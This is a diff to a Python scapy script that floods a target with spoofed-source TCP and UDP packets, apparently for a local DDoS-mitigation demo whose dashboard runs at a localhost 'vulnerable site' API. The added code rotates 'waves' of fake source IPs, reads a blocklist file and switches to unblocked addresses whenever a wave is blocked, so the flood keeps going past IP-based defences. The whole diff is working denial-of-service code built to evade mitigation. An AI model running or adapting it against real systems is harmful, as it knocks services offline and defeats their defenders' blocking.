@@ -3,7 +3,12 @@ import time
 import random
 import threading
 import socket
+import os
+import json
+import urllib.request
 from scapy.all import IP, TCP, UDP, Raw, send, get_if_list, conf
+
+VULN_SITE_API = "http://127.0.0.1:8080/api/report_traffic"
 
 # Setup Target and Interface
 def get_config():
@@ -70,12 +75,69 @@ def send_normal_traffic():
 TOTAL_SENT = 0
 stats_lock = threading.Lock()
 
+# Current active attack wave pool (shared across threads)
+current_wave = []
+wave_lock = threading.Lock()
+wave_number = [0]  # mutable counter
+
+def generate_wave(n):
+    """Generate a fresh batch of 50 unique fake IPs for wave N."""
+    # Cycle through different /16 ranges so each wave looks like a new botnet
+    ranges = [
+        (10, random.randint(30,250), random.randint(1,200)),
+        (172, random.randint(16,31), random.randint(1,200)),
+        (192, 168, random.randint(1,253)),
+        (45,  random.randint(1,250), random.randint(1,200)),
+        (185, random.randint(1,250), random.randint(1,200)),
+        (203, random.randint(1,250), random.randint(1,200)),
+    ]
+    a, b, c = random.choice(ranges)
+    ips = [f"{a}.{b}.{c}.{i}" for i in range(1, 51)]
+    print(f"\n[Wave {n}] New botnet spawned: {a}.{b}.{c}.1-50 (50 IPs)")
+    return ips
+
+# Start with wave 1
+with wave_lock:
+    wave_number[0] = 1
+    current_wave[:] = generate_wave(1)
+
+def get_blocked_ips():
+    try:
+        if os.path.exists('blocked_ips.json'):
+            with open('blocked_ips.json', 'r') as f:
+                return set(json.load(f).keys())
+    except:
+        pass
+    return set()
+
 def flood_worker(attack_type, burst_size):
-    """Worker function for heavy flood threads"""
+    """Worker that attacks in endless waves — auto-generates new IP pools when blocked."""
     global TOTAL_SENT
     while not STOP_EVENT.is_set():
         try:
-            spoofed_src = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+            blocked_ips = get_blocked_ips()
+            with wave_lock:
+                active_ips = [ip for ip in current_wave if ip not in blocked_ips]
+
+            if not active_ips:
+                # This wave is fully blocked — pause so site shows "Mitigated"
+                # Only one thread should regenerate; others wait
+                if not STOP_EVENT.is_set():
+                    with wave_lock:
+                        # Re-check inside lock to avoid race
+                        still_blocked = [ip for ip in current_wave if ip not in blocked_ips]
+                        if not still_blocked:
+                            wave_number[0] += 1
+                            print(f"\n[!] Wave {wave_number[0]-1} fully mitigated. Recovering 3s before Wave {wave_number[0]}...")
+                            push_to_site(0, TOTAL_SENT)  # signal rate=0 so site recovers
+                            time.sleep(3)              # brief recovery window
+                            new_wave = generate_wave(wave_number[0])
+                            current_wave[:] = new_wave
+                            print(f"[Wave {wave_number[0]}] Attack resuming with fresh IPs!")
+                time.sleep(0.2)
+                continue
+
+            spoofed_src = random.choice(active_ips)
             packets = []
             for _ in range(burst_size):
                 sport = random.randint(1024, 65535)
@@ -84,18 +146,33 @@ def flood_worker(attack_type, burst_size):
                 elif attack_type == "UDP_FLOOD":
                     pkt = IP(src=spoofed_src, dst=TARGET_IP)/UDP(sport=sport, dport=random.randint(1, 65535))/Raw(b"X"*64)
                 packets.append(pkt)
-            
-            # Use high-level send for better Windows driver compatibility
+
             send(packets, iface=INTERFACE, verbose=0)
-            
+
             with stats_lock:
                 TOTAL_SENT += len(packets)
-            
-            # Yield for stability
+
             time.sleep(0.01)
         except Exception:
             time.sleep(0.5)
             continue
+
+def push_to_site(rate, total):
+    """Push live traffic stats directly to the vulnerable site's API."""
+    try:
+        blocked_list = list(get_blocked_ips())
+        payload = json.dumps({
+            "rate": rate,
+            "total_packets": total,
+            "blocked_ips": blocked_list
+        }).encode()
+        req = urllib.request.Request(
+            VULN_SITE_API, data=payload,
+            headers={'Content-Type': 'application/json'}, method='POST'
+        )
+        urllib.request.urlopen(req, timeout=1)
+    except Exception:
+        pass  # Site might not be running — silently ignore
 
 def send_ddos_traffic(attack_type):
     """Generates high volume traffic using multi-threading"""
@@ -124,15 +201,23 @@ def send_ddos_traffic(attack_type):
     
     global TOTAL_SENT
     TOTAL_SENT = 0
+    last_report = 0
     
     try:
         while True:
             time.sleep(1)
             with stats_lock:
-                print(f"\r[>] Total Packets Sent: {TOTAL_SENT:,}", end="")
+                current = TOTAL_SENT
+            rate = current - last_report
+            last_report = current
+            # Push live data to the vulnerable website
+            push_to_site(rate, current)
+            print(f"\r[>] Packets sent: {current:,} | Rate: {rate:,}/s", end="")
     except KeyboardInterrupt:
         STOP_EVENT.set()
         print(f"\n\n[-] Stopping {attack_type} attack...")
+        # Signal the website that attack has stopped
+        push_to_site(0, TOTAL_SENT)
         for t in threads:
             t.join(timeout=1)
 
